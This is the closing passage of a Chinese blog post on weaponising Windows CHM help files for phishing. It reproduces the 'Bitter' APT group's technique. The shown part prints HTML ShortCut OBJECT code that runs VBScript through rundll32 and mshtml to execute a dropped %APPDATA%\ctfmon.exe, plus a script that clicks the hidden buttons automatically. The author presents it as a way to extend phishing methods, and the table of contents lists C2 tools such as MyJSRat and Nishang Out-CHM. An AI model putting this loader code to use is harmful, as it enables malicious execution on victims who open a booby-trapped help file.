path,&quot;&quot;REG_SZ&quot;&quot;:window.close()&quot;)&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>按钮z，文件存在时执行ctfmon.exe。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">z</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;,rundll32.exe,vbscript:<span class="symbol">&amp;quot;</span>\..\mshtml,,,RunHTMLApplication <span class="symbol">&amp;quot;</span>&lt;br&gt;execute(&quot;Set sfso=CreateObject(&quot;&quot;Scripting.FileSystemobject&quot;&quot;):Set wsc=CreateObject(&quot;&quot;WScript.Shell&quot;&quot;):peaddr=wsc.ExpandEnvironmentstrings(&quot;&quot;%APPDATA%&quot;&quot;)&amp;&quot;&quot;\ctfmon.exe&quot;&quot;:Set QQ=createobject(&quot;&quot;Shell.Application&quot;&quot;):For i=1 to 1000:If sfso.fileexists(peaddr) then:QQ.ShellExecute peaddr:Exit For:End If:document.write():Next:window.close()&quot;)&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>依次执行按钮x、按钮y、按钮z。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>x.Click();y.Click();z.Click();<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h1><p>本文介绍了CHM文件的组成，编译CHM文件以及反编译CHM文件。并简单介绍CHM文件通过ShortCut按钮进行恶意代码的执行，以及介绍了三个工具利用CHM文件上线C2。该文件较常被“蔓灵花组织”所利用进行钓鱼攻击。故认为有学习价值，可以扩展钓鱼方式。</p>
<h1 id="0x07-参考资料"><a href="#0x07-参考资料" class="headerlink" title="0x07 参考资料"></a>0x07 参考资料</h1><ul>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/OdCrUOsVAscqOjWaq2w8hQ">https://mp.weixin.qq.com/s/OdCrUOsVAscqOjWaq2w8hQ</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/286340.html">https://www.freebuf.com/articles/web/286340.html</a></li>
<li><a target="_blank" rel="noopener" href="https://evi1cg.me/archives/chm_backdoor.html">https://evi1cg.me/archives/chm_backdoor.html</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/SunsetR/p/12620562.html#autoid-3-0-0">https://www.cnblogs.com/SunsetR/p/12620562.html</a></li>
<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/shortcut">https://docs.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/shortcut</a></li>
<li><a target="_blank" rel="noopener" href="https://documentation.help/chm-example/shortcut_link.htm">https://documentation.help/chm-example/shortcut_link.htm</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/195373.html">https://www.freebuf.com/articles/network/195373.html</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/NLe4JqmjiB58IQ5Kn6DSLQ">https://mp.weixin.qq.com/s/NLe4JqmjiB58IQ5Kn6DSLQ</a></li>
</ul>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/links/">Friends</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/atsud0">Github</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">0x00 简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">0x01 前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#hhp-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">2.1.</span> <span class="toc-text">hhp-配置文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Example"><span class="toc-number">2.1.1.</span> <span class="toc-text">Example</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#html"><span class="toc-number">2.2.</span> <span class="toc-text">html</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ShortCut-Syntax"><span class="toc-number">2.2.1.</span> <span class="toc-text">ShortCut-Syntax</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ShortCut-Example"><span class="toc-number">2.2.2.</span> <span class="toc-text">ShortCut-Example</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hhk-%E7%B4%A2%E5%BC%95%E9%A1%B5%E9%9D%A2%E5%9C%B0%E5%9B%BE"><span class="toc-number">2.3.</span> <span class="toc-text">hhk-索引页面地图</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Example-1"><span class="toc-number">2.3.1.</span> <span class="toc-text">Example</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hhc-%E7%9B%AE%E5%BD%95%E9%A1%B5%E9%9D%A2%E5%9C%B0%E5%9B%BE"><span class="toc-number">2.4.</span> <span class="toc-text">hhc-目录页面地图</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Example-2"><span class="toc-number">2.4.1.</span> <span class="toc-text">Example</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E8%AF%91CHM%E6%96%87%E4%BB%B6"><span class="toc-number">2.5.</span> <span class="toc-text">编译CHM文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E7%BC%96%E8%AF%91CHM%E6%96%87%E4%BB%B6"><span class="toc-number">2.6.</span> <span class="toc-text">反编译CHM文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E7%9C%9F%E5%AE%9E%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">0x02 真实案例分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%9F%BA%E7%A1%80%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">4.</span> <span class="toc-text">0x03 基础攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8hhctrl-ocx%E5%AF%B9%E8%B1%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.1.</span> <span class="toc-text">利用hhctrl.ocx对象命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell"><span class="toc-number">4.1.1.</span> <span class="toc-text">powershell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hta"><span class="toc-number">4.1.2.</span> <span class="toc-text">hta</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rundll32%E8%BF%90%E8%A1%8CJS"><span class="toc-number">4.1.3.</span> <span class="toc-text">rundll32运行JS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8A%E6%94%BE%E6%96%87%E4%BB%B6%E5%B9%B6%E6%89%A7%E8%A1%8C"><span class="toc-number">4.2.</span> <span class="toc-text">释放文件并执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hh%E9%87%8A%E6%94%BE%E6%96%87%E4%BB%B6Example"><span class="toc-number">4.2.1.</span> <span class="toc-text">hh释放文件Example</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ActiveXObject"><span class="toc-number">4.3.</span> <span class="toc-text">ActiveXObject</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%85%B3%E9%97%ADActiveXObject%E6%8F%90%E7%A4%BA%E7%9A%84Bat%E8%84%9A%E6%9C%AC"><span class="toc-number">4.3.1.</span> <span class="toc-text">注册表关闭ActiveXObject提示的Bat脚本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">0x04 工具利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NISHANG-Out-CHM"><span class="toc-number">5.1.</span> <span class="toc-text">NISHANG Out-CHM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MyJSRat"><span class="toc-number">5.2.</span> <span class="toc-text">MyJSRat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DotNetToJScript"><span class="toc-number">5.3.</span> <span class="toc-text">DotNetToJScript</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E2%80%9C%E8%94%93%E7%81%B5%E8%8A%B1%E2%80%9D%E7%BB%84%E7%BB%87CHM%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%A4%8D%E7%8E%B0"><span class="toc-number">6.</span> <span class="toc-text">0x05 “蔓灵花”组织CHM利用方法复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E5%B0%8F%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text">0x06 小结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">8.</span> <span class="toc-text">0x07 参考资料</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://atsud0.me/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-CHM%E6%96%87%E4%BB%B6%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://atsud0.me/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-CHM%E6%96%87%E4%BB%B6%E7%AC%94%E8%AE%B0/&text=【钓鱼从入门到放弃】-CHM文件笔记"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://atsud0.me/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-CHM%E6%96%87%E4%BB%B6%E7%AC%94%E8%AE%B0/&title=【钓鱼从入门到放弃】-CHM文件笔记"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【钓鱼从入门到放弃】-CHM文件笔记&body=Check out this article: https://atsud0.me/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-CHM%E6%96%87%E4%BB%B6%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://atsud0.me/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-CHM%E6%96%87%E4%BB%B6%E7%AC%94%E8%AE%B0/&title=【钓鱼从入门到放弃】-CHM文件笔记"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://atsud0.me/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-CHM%E6%96%87%E4%BB%B6%E7%AC%94%E8%AE%B0/&name=【钓鱼从入门到放弃】-CHM文件笔记&description=&lt;p&gt;关于CHM文件的学习。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://atsud0.me/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-CHM%E6%96%87%E4%BB%B6%E7%AC%94%E8%AE%B0/&t=【钓鱼从入门到放弃】-CHM文件笔记"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2020-2024
    atsud0
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/links/">Friends</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/atsud0">Github</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

  <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "069018536ef0421ebc5bb5e449328773"}'></script>

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
